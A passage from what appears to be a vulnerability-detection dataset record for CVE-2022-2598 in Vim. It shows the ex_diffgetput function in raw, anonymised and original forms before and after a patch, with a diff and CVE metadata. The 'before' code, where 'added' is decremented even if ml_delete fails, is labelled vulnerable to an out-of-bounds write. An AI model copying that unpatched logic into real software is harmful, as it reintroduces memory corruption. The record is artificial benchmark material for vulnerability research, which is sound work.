}
else
{
count -= start_skip;
lnum += start_skip;
}
}
else
start_skip = 0;
end_skip = dp->df_lnum[idx_cur] + dp->df_count[idx_cur] - 1
- (eap->line2 + off);
if (end_skip > 0)
{
if (idx_cur == idx_from)    {
i = dp->df_count[idx_cur] - start_skip - end_skip;
if (count > i)
count = i;
}
else    {
count -= end_skip;
end_skip = dp->df_count[idx_from] - start_skip - count;
if (end_skip < 0)
end_skip = 0;
}
}
else
end_skip = 0;
}
buf_empty = BUFEMPTY();
added = 0;
for (i = 0; i < count; ++i)
{
buf_empty = curbuf->b_ml.ml_line_count == 1;
ml_delete(lnum);
--added;
}
for (i = 0; i < dp->df_count[idx_from] - start_skip - end_skip; ++i)
{
linenr_T nr;
nr = dp->df_lnum[idx_from] + start_skip + i;
if (nr > curtab->tp_diffbuf[idx_from]->b_ml.ml_line_count)
break;
p = vim_strsave(ml_get_buf(curtab->tp_diffbuf[idx_from],
nr, FALSE));
if (p != NULL)
{
ml_append(lnum + i - 1, p, 0, FALSE);
vim_free(p);
++added;
if (buf_empty && curbuf->b_ml.ml_line_count == 2)
{
buf_empty = FALSE;
ml_delete((linenr_T)2);
}
}
}
new_count = dp->df_count[idx_to] + added;
dp->df_count[idx_to] = new_count;
if (start_skip == 0 && end_skip == 0)
{
for (i = 0; i < DB_COUNT; ++i)
if (curtab->tp_diffbuf[i] != NULL && i != idx_from
&& i != idx_to
&& !diff_equal_entry(dp, idx_from, i))
break;
if (i == DB_COUNT)
{
dfree = dp;
dp = dp->df_next;
if (dprev == NULL)
curtab->tp_first_diff = dp;
else
dprev->df_next = dp;
}
}
if (added != 0)
{
mark_adjust(lnum, lnum + count - 1, (long)MAXLNUM, (long)added);
if (curwin->w_cursor.lnum >= lnum)
{
if (curwin->w_cursor.lnum >= lnum + count)
curwin->w_cursor.lnum += added;
else if (added < 0)
curwin->w_cursor.lnum = lnum;
}
}
changed_lines(lnum, 0, lnum + count, (long)added);
if (dfree != NULL)
{
#ifdef FEAT_FOLDING
diff_fold_update(dfree, idx_to);
#endif
vim_free(dfree);
}
if (added != 0 && !valid_diff(dp))
break;
if (dfree == NULL)
dp->df_count[idx_to] = new_count;
if (idx_cur == idx_to)
off += added;
}
if (dfree == NULL)
{
dprev = dp;
dp = dp->df_next;
}
}
if (eap->cmdidx != CMD_diffget)
{
if (KeyTyped)
u_sync(FALSE);
aucmd_restbuf(&aco);
}
theend:
diff_busy = FALSE;
if (diff_need_update)
ex_diffupdate(NULL);
check_cursor();
changed_line_abv_curs();
if (diff_need_update)
diff_need_update = FALSE;
else
{
diff_redraw(FALSE);
apply_autocmds(EVENT_DIFFUPDATED, NULL, NULL, FALSE, curbuf);
}
}","void
ex_diffgetput(exarg_T *VAR_0)
{
linenr_TVAR_1;
intVAR_2;
linenr_TVAR_3 = 0;
diff_T*VAR_4;
diff_T*VAR_5;
diff_T*VAR_6;
intVAR_7;
intVAR_8;
intVAR_9;
intVAR_10;
intVAR_11;
intVAR_12;
char_u*VAR_13;
aco_save_TVAR_14;
buf_T*VAR_15;
intVAR_16, VAR_17;
intVAR_18;
intVAR_19;
intVAR_20 = FALSE;
VAR_7 = diff_buf_idx(VAR_21);
if (VAR_7 == VAR_22)
{
emsg(_(VAR_23));
return;
}
if (*VAR_0->arg == VAR_24)
{
for (VAR_8 = 0; VAR_8 < VAR_22; ++VAR_8)
if (VAR_25->tp_diffbuf[VAR_8] != VAR_21
&& VAR_25->tp_diffbuf[VAR_8] != NULL)
{
if (VAR_0->cmdidx != VAR_26
|| VAR_25->tp_diffbuf[VAR_8]->b_p_ma)
break;
VAR_20 = TRUE;
}
if (VAR_8 == VAR_22)
{
if (VAR_20)
emsg(_(VAR_27));
else
emsg(_(VAR_28));
return;
}
for (VAR_11 = VAR_8 + 1; VAR_11 < VAR_22; ++VAR_11)
if (VAR_25->tp_diffbuf[VAR_11] != VAR_21
&& VAR_25->tp_diffbuf[VAR_11] != NULL
&& (VAR_0->cmdidx != VAR_26 || VAR_25->tp_diffbuf[VAR_11]->b_p_ma))
{
emsg(_(VAR_29));
return;
}
}
else
{
VAR_13 = VAR_0->arg + STRLEN(VAR_0->arg);
while (VAR_13 > VAR_0->arg && VIM_ISWHITE(VAR_13[-1]))
--VAR_13;
for (VAR_11 = 0; vim_isdigit(VAR_0->arg[VAR_11]) && VAR_0->arg + VAR_11 < VAR_13; ++VAR_11)
;
if (VAR_0->arg + VAR_11 == VAR_13)    
VAR_11 = atol((char *)VAR_0->arg);
else
{
VAR_11 = buflist_findpat(VAR_0->arg, VAR_13, FALSE, TRUE, FALSE);
if (VAR_11 < 0)
return;
}
VAR_15 = buflist_findnr(VAR_11);
if (VAR_15 == NULL)
{
semsg(_(VAR_30), VAR_0->arg);
return;
}
if (VAR_15 == VAR_21)
return;
VAR_8 = diff_buf_idx(VAR_15);
if (VAR_8 == VAR_22)
{
semsg(_(VAR_31), VAR_0->arg);
return;
}
}
VAR_32 = TRUE;
if (VAR_0->addr_count == 0)
{
if (VAR_0->cmdidx == VAR_33
&& VAR_0->line1 == VAR_21->b_ml.ml_line_count
&& diff_check(VAR_34, VAR_0->line1) == 0
&& (VAR_0->line1 == 1 || diff_check(VAR_34, VAR_0->line1 - 1) == 0))
++VAR_0->line2;
else if (VAR_0->line1 > 0)
--VAR_0->line1;
}
if (VAR_0->cmdidx == VAR_33)
{
VAR_9 = VAR_8;
VAR_10 = VAR_7;
}
else
{
VAR_9 = VAR_7;
VAR_10 = VAR_8;
aucmd_prepbuf(&VAR_14, VAR_25->tp_diffbuf[VAR_8]);
}
if (!VAR_21->b_changed)
{
change_warning(0);
if (diff_buf_idx(VAR_21) != VAR_10)
{
emsg(_(VAR_35));
goto theend;
}
}
VAR_5 = NULL;
for (VAR_4 = VAR_25->tp_first_diff; VAR_4 != NULL; )
{
if (VAR_4->df_lnum[VAR_7] > VAR_0->line2 + VAR_3)
break;
VAR_6 = NULL;
VAR_1 = VAR_4->df_lnum[VAR_10];
VAR_2 = VAR_4->df_count[VAR_10];
if (VAR_4->df_lnum[VAR_7] + VAR_4->df_count[VAR_7] > VAR_0->line1 + VAR_3
&& u_save(VAR_1 - 1, VAR_1 + VAR_2) != VAR_36)
{
VAR_16 = 0;
VAR_17 = 0;
if (VAR_0->addr_count > 0)
{
VAR_16 = VAR_0->line1 + VAR_3 - VAR_4->df_lnum[VAR_7];
if (VAR_16 > 0)
{
if (VAR_16 > VAR_2)
{
VAR_1 += VAR_2;
VAR_2 = 0;
}
else
{
VAR_2 -= VAR_16;
VAR_1 += VAR_16;
}
}
else
VAR_16 = 0;
VAR_17 = VAR_4->df_lnum[VAR_7] + VAR_4->df_count[VAR_7] - 1
- (VAR_0->line2 + VAR_3);
if (VAR_17 > 0)
{
if (VAR_7 == VAR_9)
{
VAR_11 = VAR_4->df_count[VAR_7] - VAR_16 - VAR_17;
if (VAR_2 > VAR_11)
VAR_2 = VAR_11;
}
else
{
VAR_2 -= VAR_17;
VAR_17 = VAR_4->df_count[VAR_9] - VAR_16 - VAR_2;
if (VAR_17 < 0)
VAR_17 = 0;
}
}
else
VAR_17 = 0;
}
VAR_19 = BUFEMPTY();
VAR_12 = 0;
for (VAR_11 = 0; VAR_11 < VAR_2; ++VAR_11)
{
VAR_19 = VAR_21->b_ml.ml_line_count == 1;
ml_delete(VAR_1);
--VAR_12;
}
for (VAR_11 = 0; VAR_11 < VAR_4->df_count[VAR_9] - VAR_16 - VAR_17; ++VAR_11)
{
linenr_T VAR_37;
VAR_37 = VAR_4->df_lnum[VAR_9] + VAR_16 + VAR_11;
if (VAR_37 > VAR_25->tp_diffbuf[VAR_9]->b_ml.ml_line_count)
break;
VAR_13 = vim_strsave(ml_get_buf(VAR_25->tp_diffbuf[VAR_9],
VAR_37, FALSE));
if (VAR_13 != NULL)
{
ml_append(VAR_1 + VAR_11 - 1, VAR_13, 0, FALSE);
vim_free(VAR_13);
++VAR_12;
if (VAR_19 && VAR_21->b_ml.ml_line_count == 2)
{
VAR_19 = FALSE;
ml_delete((linenr_T)2);
}
}
}
VAR_18 = VAR_4->df_count[VAR_10] + VAR_12;
VAR_4->df_count[VAR_10] = VAR_18;
if (VAR_16 == 0 && VAR_17 == 0)
{
for (VAR_11 = 0; VAR_11 < VAR_22; ++VAR_11)
if (VAR_25->tp_diffbuf[VAR_11] != NULL && VAR_11 != VAR_9
&& VAR_11 != VAR_10
&& !diff_equal_entry(VAR_4, VAR_9, VAR_11))
break;
if (VAR_11 == VAR_22)
{
VAR_6 = VAR_4;
VAR_4 = VAR_4->df_next;
if (VAR_5 == NULL)
VAR_25->tp_first_diff = VAR_4;
else
VAR_5->df_next = VAR_4;
}
}
if (VAR_12 != 0)
{
mark_adjust(VAR_1, VAR_1 + VAR_2 - 1, (long)VAR_38, (long)VAR_12);
if (VAR_34->w_cursor.lnum >= VAR_1)
{
if (VAR_34->w_cursor.lnum >= VAR_1 + VAR_2)
VAR_34->w_cursor.lnum += VAR_12;
else if (VAR_12 < 0)
VAR_34->w_cursor.lnum = VAR_1;
}
}
changed_lines(VAR_1, 0, VAR_1 + VAR_2, (long)VAR_12);
if (VAR_6 != NULL)
{
#ifdef VAR_39
diff_fold_update(VAR_6, VAR_10);
#endif
vim_free(VAR_6);
}
if (VAR_12 != 0 && !valid_diff(VAR_4))
break;
if (VAR_6 == NULL)
VAR_4->df_count[VAR_10] = VAR_18;
if (VAR_7 == VAR_10)
VAR_3 += VAR_12;
}
if (VAR_6 == NULL)
{
VAR_5 = VAR_4;
VAR_4 = VAR_4->df_next;
}
}
if (VAR_0->cmdidx != VAR_33)
{
if (VAR_40)
u_sync(FALSE);
aucmd_restbuf(&VAR_14);
}
theend:
VAR_32 = FALSE;
if (VAR_41)
ex_diffupdate(NULL);
check_cursor();
changed_line_abv_curs();
if (VAR_41)
VAR_41 = FALSE;
else
{
diff_redraw(FALSE);
apply_autocmds(VAR_42, NULL, NULL, FALSE, VAR_21);
}
}",vim/4e677b9c40ccbc5f090971b31dc2fe07bf05541d/diff.c/vul/before/1.json,"void
ex_diffgetput(exarg_T *eap)
{
    linenr_T	lnum;
    int		count;
    linenr_T	off = 0;
    diff_T	*dp;
    diff_T	*dprev;
    diff_T	*dfree;
    int		idx_cur;
    int		idx_other;
    int		idx_from;
    int		idx_to;
    int		i;
    int		added;
    char_u	*p;
    aco_save_T	aco;
    buf_T	*buf;
    int		start_skip, end_skip;
    int		new_count;
    int		buf_empty;
    int		found_not_ma = FALSE;

    // Find the current buffer in the list of diff buffers.
    idx_cur = diff_buf_idx(curbuf);
    if (idx_cur == DB_COUNT)
    {
	emsg(_(e_current_buffer_is_not_in_diff_mode));
	return;
    }

    if (*eap->arg == NUL)
    {
	// No argument: Find the other buffer in the list of diff buffers.
	for (idx_other = 0; idx_other < DB_COUNT; ++idx_other)
	    if (curtab->tp_diffbuf[idx_other] != curbuf
		    && curtab->tp_diffbuf[idx_other] != NULL)
	    {
		if (eap->cmdidx != CMD_diffput
				     || curtab->tp_diffbuf[idx_other]->b_p_ma)
		    break;
		found_not_ma = TRUE;
	    }
	if (idx_other == DB_COUNT)
	{
	    if (found_not_ma)
		emsg(_(e_no_other_buffer_in_diff_mode_is_modifiable));
	    else
		emsg(_(e_no_other_buffer_in_diff_mode));
	    return;
	}

	// Check that there isn't a third buffer in the list
	for (i = idx_other + 1; i < DB_COUNT; ++i)
	    if (curtab->tp_diffbuf[i] != curbuf
		    && curtab->tp_diffbuf[i] != NULL
		    && (eap->cmdidx != CMD_diffput || curtab->tp_diffbuf[i]->b_p_ma))
	    {
		emsg(_(e_more_than_two_buffers_in_diff_mode_dont_know_which_one_to_use));
		return;
	    }
    }
    else
    {
	// Buffer number or pattern given.  Ignore trailing white space.
	p = eap->arg + STRLEN(eap->arg);
	while (p > eap->arg && VIM_ISWHITE(p[-1]))
	    --p;
	for (i = 0; vim_isdigit(eap->arg[i]) && eap->arg + i < p; ++i)
	    ;
	if (eap->arg + i == p)	    // digits only
	    i = atol((char *)eap->arg);
	else
	{
	    i = buflist_findpat(eap->arg, p, FALSE, TRUE, FALSE);
	    if (i < 0)
		return;		// error message already given
	}
	buf = buflist_findnr(i);
	if (buf == NULL)
	{
	    semsg(_(e_cant_find_buffer_str), eap->arg);
	    return;
	}
	if (buf == curbuf)
	    return;		// nothing to do
	idx_other = diff_buf_idx(buf);
	if (idx_other == DB_COUNT)
	{
	    semsg(_(e_buffer_str_is_not_in_diff_mode), eap->arg);
	    return;
	}
    }

    diff_busy = TRUE;

    // When no range given include the line above or below the cursor.
    if (eap->addr_count == 0)
    {
	// Make it possible that "":diffget"" on the last line gets line below
	// the cursor line when there is no difference above the cursor.
	if (eap->cmdidx == CMD_diffget
		&& eap->line1 == curbuf->b_ml.ml_line_count
		&& diff_check(curwin, eap->line1) == 0
		&& (eap->line1 == 1 || diff_check(curwin, eap->line1 - 1) == 0))
	    ++eap->line2;
	else if (eap->line1 > 0)
	    --eap->line1;
    }

    if (eap->cmdidx == CMD_diffget)
    {
	idx_from = idx_other;
	idx_to = idx_cur;
    }
    else
    {
	idx_from = idx_cur;
	idx_to = idx_other;
	// Need to make the other buffer the current buffer to be able to make
	// changes in it.
	// set curwin/curbuf to buf and save a few things
	aucmd_prepbuf(&aco, curtab->tp_diffbuf[idx_other]);
    }

    // May give the warning for a changed buffer here, which can trigger the
    // FileChangedRO autocommand, which may do nasty things and mess
    // everything up.
    if (!curbuf->b_changed)
    {
	change_warning(0);
	if (diff_buf_idx(curbuf) != idx_to)
	{
	    emsg(_(e_buffer_changed_unexpectedly));
	    goto theend;
	}
    }

    dprev = NULL;
    for (dp = curtab->tp_first_diff; dp != NULL; )
    {
	if (dp->df_lnum[idx_cur] > eap->line2 + off)
	    break;	// past the range that was specified

	dfree = NULL;
	lnum = dp->df_lnum[idx_to];
	count = dp->df_count[idx_to];
	if (dp->df_lnum[idx_cur] + dp->df_count[idx_cur] > eap->line1 + off
		&& u_save(lnum - 1, lnum + count) != FAIL)
	{
	    // Inside the specified range and saving for undo worked.
	    start_skip = 0;
	    end_skip = 0;
	    if (eap->addr_count > 0)
	    {
		// A range was specified: check if lines need to be skipped.
		start_skip = eap->line1 + off - dp->df_lnum[idx_cur];
		if (start_skip > 0)
		{
		    // range starts below start of current diff block
		    if (start_skip > count)
		    {
			lnum += count;
			count = 0;
		    }
		    else
		    {
			count -= start_skip;
			lnum += start_skip;
		    }
		}
		else
		    start_skip = 0;

		end_skip = dp->df_lnum[idx_cur] + dp->df_count[idx_cur] - 1
							 - (eap->line2 + off);
		if (end_skip > 0)
		{
		    // range ends above end of current/from diff block
		    if (idx_cur == idx_from)	// :diffput
		    {
			i = dp->df_count[idx_cur] - start_skip - end_skip;
			if (count > i)
			    count = i;
		    }
		    else			// :diffget
		    {
			count -= end_skip;
			end_skip = dp->df_count[idx_from] - start_skip - count;
			if (end_skip < 0)
			    end_skip = 0;
		    }
		}
		else
		    end_skip = 0;
	    }

	    buf_empty = BUFEMPTY();
	    added = 0;
	    for (i = 0; i < count; ++i)
	    {
		// remember deleting the last line of the buffer
		buf_empty = curbuf->b_ml.ml_line_count == 1;
		if (ml_delete(lnum) == OK)
		    --added;
	    }
	    for (i = 0; i < dp->df_count[idx_from] - start_skip - end_skip; ++i)
	    {
		linenr_T nr;

		nr = dp->df_lnum[idx_from] + start_skip + i;
		if (nr > curtab->tp_diffbuf[idx_from]->b_ml.ml_line_count)
		    break;
		p = vim_strsave(ml_get_buf(curtab->tp_diffbuf[idx_from],
								  nr, FALSE));
		if (p != NULL)
		{
		    ml_append(lnum + i - 1, p, 0, FALSE);
		    vim_free(p);
		    ++added;
		    if (buf_empty && curbuf->b_ml.ml_line_count == 2)
		    {
			// Added the first line into an empty buffer, need to
			// delete the dummy empty line.
			buf_empty = FALSE;
			ml_delete((linenr_T)2);
		    }
		}
	    }
	    new_count = dp->df_count[idx_to] + added;
	    dp->df_count[idx_to] = new_count;

	    if (start_skip == 0 && end_skip == 0)
	    {
		// Check if there are any other buffers and if the diff is
		// equal in them.
		for (i = 0; i < DB_COUNT; ++i)
		    if (curtab->tp_diffbuf[i] != NULL && i != idx_from
								&& i != idx_to
			    && !diff_equal_entry(dp, idx_from, i))
			break;
		if (i == DB_COUNT)
		{
		    // delete the diff entry, the buffers are now equal here
		    dfree = dp;
		    dp = dp->df_next;
		    if (dprev == NULL)
			curtab->tp_first_diff = dp;
		    else
			dprev->df_next = dp;
		}
	    }

	    if (added != 0)
	    {
		// Adjust marks.  This will change the following entries!
		mark_adjust(lnum, lnum + count - 1, (long)MAXLNUM, (long)added);
		if (curwin->w_cursor.lnum >= lnum)
		{
		    // Adjust the cursor position if it's in/after the changed
		    // lines.
		    if (curwin->w_cursor.lnum >= lnum + count)
			curwin->w_cursor.lnum += added;
		    else if (added < 0)
			curwin->w_cursor.lnum = lnum;
		}
	    }
	    changed_lines(lnum, 0, lnum + count, (long)added);

	    if (dfree != NULL)
	    {
		// Diff is deleted, update folds in other windows.
#ifdef FEAT_FOLDING
		diff_fold_update(dfree, idx_to);
#endif
		vim_free(dfree);
	    }

	    // mark_adjust() may have made ""dp"" invalid.  We don't know where
	    // to continue then, bail out.
	    if (added != 0 && !valid_diff(dp))
		break;

	    if (dfree == NULL)
		// mark_adjust() may have changed the count in a wrong way
		dp->df_count[idx_to] = new_count;

	    // When changing the current buffer, keep track of line numbers
	    if (idx_cur == idx_to)
		off += added;
	}

	// If before the range or not deleted, go to next diff.
	if (dfree == NULL)
	{
	    dprev = dp;
	    dp = dp->df_next;
	}
    }

    // restore curwin/curbuf and a few other things
    if (eap->cmdidx != CMD_diffget)
    {
	// Syncing undo only works for the current buffer, but we change
	// another buffer.  Sync undo if the command was typed.  This isn't
	// 100% right when "":diffput"" is used in a function or mapping.
	if (KeyTyped)
	    u_sync(FALSE);
	aucmd_restbuf(&aco);
    }

theend:
    diff_busy = FALSE;
    if (diff_need_update)
	ex_diffupdate(NULL);

    // Check that the cursor is on a valid character and update its
    // position.  When there were filler lines the topline has become
    // invalid.
    check_cursor();
    changed_line_abv_curs();

    if (diff_need_update)
	// redraw already done by ex_diffupdate()
	diff_need_update = FALSE;
    else
    {
	// Also need to redraw the other buffers.
	diff_redraw(FALSE);
	apply_autocmds(EVENT_DIFFUPDATED, NULL, NULL, FALSE, curbuf);
    }
}","void
ex_diffgetput(exarg_T *VAR_0)
{
    linenr_T	VAR_1;
    int		VAR_2;
    linenr_T	VAR_3 = 0;
    diff_T	*VAR_4;
    diff_T	*VAR_5;
    diff_T	*VAR_6;
    int		VAR_7;
    int		VAR_8;
    int		VAR_9;
    int		VAR_10;
    int		VAR_11;
    int		VAR_12;
    char_u	*VAR_13;
    aco_save_T	VAR_14;
    buf_T	*VAR_15;
    int		VAR_16, VAR_17;
    int		VAR_18;
    int		VAR_19;
    int		VAR_20 = FALSE;

    /* COMMENT_0 */
    VAR_7 = diff_buf_idx(VAR_21);
    if (VAR_7 == VAR_22)
    {
	emsg(_(VAR_23));
	return;
    }

    if (*VAR_0->arg == VAR_24)
    {
	/* COMMENT_1 */
	for (VAR_8 = 0; VAR_8 < VAR_22; ++VAR_8)
	    if (VAR_25->tp_diffbuf[VAR_8] != VAR_21
		    && VAR_25->tp_diffbuf[VAR_8] != NULL)
	    {
		if (VAR_0->cmdidx != VAR_26
				     || VAR_25->tp_diffbuf[VAR_8]->b_p_ma)
		    break;
		VAR_20 = TRUE;
	    }
	if (VAR_8 == VAR_22)
	{
	    if (VAR_20)
		emsg(_(VAR_27));
	    else
		emsg(_(VAR_28));
	    return;
	}

	/* COMMENT_2 */
	for (VAR_11 = VAR_8 + 1; VAR_11 < VAR_22; ++VAR_11)
	    if (VAR_25->tp_diffbuf[VAR_11] != VAR_21
		    && VAR_25->tp_diffbuf[VAR_11] != NULL
		    && (VAR_0->cmdidx != VAR_26 || VAR_25->tp_diffbuf[VAR_11]->b_p_ma))
	    {
		emsg(_(VAR_29));
		return;
	    }
    }
    else
    {
	/* COMMENT_3 */
	VAR_13 = VAR_0->arg + STRLEN(VAR_0->arg);
	while (VAR_13 > VAR_0->arg && VIM_ISWHITE(VAR_13[-1]))
	    --VAR_13;
	for (VAR_11 = 0; vim_isdigit(VAR_0->arg[VAR_11]) && VAR_0->arg + VAR_11 < VAR_13; ++VAR_11)
	    ;
	if (VAR_0->arg + VAR_11 == VAR_13)	    /* COMMENT_4 */
	    VAR_11 = atol((char *)VAR_0->arg);
	else
	{
	    VAR_11 = buflist_findpat(VAR_0->arg, VAR_13, FALSE, TRUE, FALSE);
	    if (VAR_11 < 0)
		return;		/* COMMENT_5 */
	}
	VAR_15 = buflist_findnr(VAR_11);
	if (VAR_15 == NULL)
	{
	    semsg(_(VAR_30), VAR_0->arg);
	    return;
	}
	if (VAR_15 == VAR_21)
	    return;		/* COMMENT_6 */
	VAR_8 = diff_buf_idx(VAR_15);
	if (VAR_8 == VAR_22)
	{
	    semsg(_(VAR_31), VAR_0->arg);
	    return;
	}
    }

    VAR_32 = TRUE;

    /* COMMENT_7 */
    if (VAR_0->addr_count == 0)
    {
	/* COMMENT_8 */
	/* COMMENT_9 */
	if (VAR_0->cmdidx == VAR_33
		&& VAR_0->line1 == VAR_21->b_ml.ml_line_count
		&& diff_check(VAR_34, VAR_0->line1) == 0
		&& (VAR_0->line1 == 1 || diff_check(VAR_34, VAR_0->line1 - 1) == 0))
	    ++VAR_0->line2;
	else if (VAR_0->line1 > 0)
	    --VAR_0->line1;
    }

    if (VAR_0->cmdidx == VAR_33)
    {
	VAR_9 = VAR_8;
	VAR_10 = VAR_7;
    }
    else
    {
	VAR_9 = VAR_7;
	VAR_10 = VAR_8;
	/* COMMENT_10 */
	/* COMMENT_11 */
	/* COMMENT_12 */
	aucmd_prepbuf(&VAR_14, VAR_25->tp_diffbuf[VAR_8]);
    }

    /* COMMENT_13 */
    /* COMMENT_14 */
    /* COMMENT_15 */
    if (!VAR_21->b_changed)
    {
	change_warning(0);
	if (diff_buf_idx(VAR_21) != VAR_10)
	{
	    emsg(_(VAR_35));
	    goto theend;
	}
    }

    VAR_5 = NULL;
    for (VAR_4 = VAR_25->tp_first_diff; VAR_4 != NULL; )
    {
	if (VAR_4->df_lnum[VAR_7] > VAR_0->line2 + VAR_3)
	    break;	/* COMMENT_16 */

	VAR_6 = NULL;
	VAR_1 = VAR_4->df_lnum[VAR_10];
	VAR_2 = VAR_4->df_count[VAR_10];
	if (VAR_4->df_lnum[VAR_7] + VAR_4->df_count[VAR_7] > VAR_0->line1 + VAR_3
		&& u_save(VAR_1 - 1, VAR_1 + VAR_2) != VAR_36)
	{
	    /* COMMENT_17 */
	    VAR_16 = 0;
	    VAR_17 = 0;
	    if (VAR_0->addr_count > 0)
	    {
		/* COMMENT_18 */
		VAR_16 = VAR_0->line1 + VAR_3 - VAR_4->df_lnum[VAR_7];
		if (VAR_16 > 0)
		{
		    /* COMMENT_19 */
		    if (VAR_16 > VAR_2)
		    {
			VAR_1 += VAR_2;
			VAR_2 = 0;
		    }
		    else
		    {
			VAR_2 -= VAR_16;
			VAR_1 += VAR_16;
		    }
		}
		else
		    VAR_16 = 0;

		VAR_17 = VAR_4->df_lnum[VAR_7] + VAR_4->df_count[VAR_7] - 1
							 - (VAR_0->line2 + VAR_3);
		if (VAR_17 > 0)
		{
		    /* COMMENT_20 */
		    if (VAR_7 == VAR_9)	/* COMMENT_21 */
		    {
			VAR_11 = VAR_4->df_count[VAR_7] - VAR_16 - VAR_17;
			if (VAR_2 > VAR_11)
			    VAR_2 = VAR_11;
		    }
		    else			/* COMMENT_22 */
		    {
			VAR_2 -= VAR_17;
			VAR_17 = VAR_4->df_count[VAR_9] - VAR_16 - VAR_2;
			if (VAR_17 < 0)
			    VAR_17 = 0;
		    }
		}
		else
		    VAR_17 = 0;
	    }

	    VAR_19 = BUFEMPTY();
	    VAR_12 = 0;
	    for (VAR_11 = 0; VAR_11 < VAR_2; ++VAR_11)
	    {
		/* COMMENT_23 */
		VAR_19 = VAR_21->b_ml.ml_line_count == 1;
		if (ml_delete(VAR_1) == VAR_37)
		    --VAR_12;
	    }
	    for (VAR_11 = 0; VAR_11 < VAR_4->df_count[VAR_9] - VAR_16 - VAR_17; ++VAR_11)
	    {
		linenr_T VAR_38;

		VAR_38 = VAR_4->df_lnum[VAR_9] + VAR_16 + VAR_11;
		if (VAR_38 > VAR_25->tp_diffbuf[VAR_9]->b_ml.ml_line_count)
		    break;
		VAR_13 = vim_strsave(ml_get_buf(VAR_25->tp_diffbuf[VAR_9],
								  VAR_38, FALSE));
		if (VAR_13 != NULL)
		{
		    ml_append(VAR_1 + VAR_11 - 1, VAR_13, 0, FALSE);
		    vim_free(VAR_13);
		    ++VAR_12;
		    if (VAR_19 && VAR_21->b_ml.ml_line_count == 2)
		    {
			/* COMMENT_24 */
			/* COMMENT_25 */
			VAR_19 = FALSE;
			ml_delete((linenr_T)2);
		    }
		}
	    }
	    VAR_18 = VAR_4->df_count[VAR_10] + VAR_12;
	    VAR_4->df_count[VAR_10] = VAR_18;

	    if (VAR_16 == 0 && VAR_17 == 0)
	    {
		/* COMMENT_26 */
		/* COMMENT_27 */
		for (VAR_11 = 0; VAR_11 < VAR_22; ++VAR_11)
		    if (VAR_25->tp_diffbuf[VAR_11] != NULL && VAR_11 != VAR_9
								&& VAR_11 != VAR_10
			    && !diff_equal_entry(VAR_4, VAR_9, VAR_11))
			break;
		if (VAR_11 == VAR_22)
		{
		    /* COMMENT_28 */
		    VAR_6 = VAR_4;
		    VAR_4 = VAR_4->df_next;
		    if (VAR_5 == NULL)
			VAR_25->tp_first_diff = VAR_4;
		    else
			VAR_5->df_next = VAR_4;
		}
	    }

	    if (VAR_12 != 0)
	    {
		/* COMMENT_29 */
		mark_adjust(VAR_1, VAR_1 + VAR_2 - 1, (long)VAR_39, (long)VAR_12);
		if (VAR_34->w_cursor.lnum >= VAR_1)
		{
		    /* COMMENT_30 */
		    /* COMMENT_31 */
		    if (VAR_34->w_cursor.lnum >= VAR_1 + VAR_2)
			VAR_34->w_cursor.lnum += VAR_12;
		    else if (VAR_12 < 0)
			VAR_34->w_cursor.lnum = VAR_1;
		}
	    }
	    changed_lines(VAR_1, 0, VAR_1 + VAR_2, (long)VAR_12);

	    if (VAR_6 != NULL)
	    {
		/* COMMENT_32 */
#ifdef VAR_40
		diff_fold_update(VAR_6, VAR_10);
#endif
		vim_free(VAR_6);
	    }

	    /* COMMENT_33 */
	    /* COMMENT_34 */
	    if (VAR_12 != 0 && !valid_diff(VAR_4))
		break;

	    if (VAR_6 == NULL)
		/* COMMENT_35 */
		VAR_4->df_count[VAR_10] = VAR_18;

	    /* COMMENT_36 */
	    if (VAR_7 == VAR_10)
		VAR_3 += VAR_12;
	}

	/* COMMENT_37 */
	if (VAR_6 == NULL)
	{
	    VAR_5 = VAR_4;
	    VAR_4 = VAR_4->df_next;
	}
    }

    /* COMMENT_38 */
    if (VAR_0->cmdidx != VAR_33)
    {
	/* COMMENT_39 */
	/* COMMENT_40 */
	/* COMMENT_41 */
	if (VAR_41)
	    u_sync(FALSE);
	aucmd_restbuf(&VAR_14);
    }

theend:
    VAR_32 = FALSE;
    if (VAR_42)
	ex_diffupdate(NULL);

    /* COMMENT_42 */
    /* COMMENT_43 */
    /* COMMENT_44 */
    check_cursor();
    changed_line_abv_curs();

    if (VAR_42)
	/* COMMENT_45 */
	VAR_42 = FALSE;
    else
    {
	/* COMMENT_46 */
	diff_redraw(FALSE);
	apply_autocmds(VAR_43, NULL, NULL, FALSE, VAR_21);
    }
}",vim/4e677b9c40ccbc5f090971b31dc2fe07bf05541d/diff.c/vul/after/1.json,"--- func_before
+++ func_after
@@ -201,8 +201,8 @@
 	    {
 		// remember deleting the last line of the buffer
 		buf_empty = curbuf->b_ml.ml_line_count == 1;
-		ml_delete(lnum);
-		--added;
+		if (ml_delete(lnum) == OK)
+		    --added;
 	    }
 	    for (i = 0; i < dp->df_count[idx_from] - start_skip - end_skip; ++i)
 	    {","{'deleted_lines': ['\t\tml_delete(lnum);', '\t\t--added;'], 'added_lines': ['\t\tif (ml_delete(lnum) == OK)', '\t\t    --added;']}",True,"Out-of-bounds Write to API in GitHub repository vim/vim prior to 9.0.0100.

",6.5,MEDIUM,1,valid,2022-07-28T17:44:27Z,4
CVE-2022-2598,['CWE-787'],CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H,1,vim,"patch 9.0.0101: invalid memory access in diff mode with ""dp"" and undo

Problem:    Invalid memory access in diff mode with ""dp"" and undo.
Solution:   Make sure the line number does not go below one.",4e677b9c40ccbc5f090971b31dc2fe07bf05541d,https://github.com/vim/vim/commit/4e677b9c40ccbc5f090971b31dc2fe07bf05541d,src/diff.c,diff_mark_adjust_tp,"static void
diff_mark_adjust_tp(
tabpage_T*tp,
intidx,
linenr_Tline1,
linenr_Tline2,
longamount,
longamount_after)
{
diff_T*dp;
diff_T*dprev;
diff_T*dnext;
inti;
intinserted, deleted;
intn, off;
linenr_Tlast;
linenr_Tlnum_deleted = line1;    intcheck_unchanged;
if (diff_internal())
{
tp->tp_diff_invalid = TRUE;
tp->tp_diff_update = TRUE;
}
if (line2 == MAXLNUM)
{
inserted = amount;
deleted = 0;
}
else if (amount_after > 0)
{
inserted = amount_after;
deleted = 0;
}
else
{
inserted = 0;
deleted = -amount_after;
}
dprev = NULL;
dp = tp->tp_first_diff;
for (;;)
{
if ((dp == NULL || dp->df_lnum[idx] - 1 > line2
|| (line2 == MAXLNUM && dp->df_lnum[idx] > line1))
&& (dprev == NULL
|| dprev->df_lnum[idx] + dprev->df_count[idx] < line1)
&& !diff_busy)
{
dnext = diff_alloc_new(tp, dprev, dp);
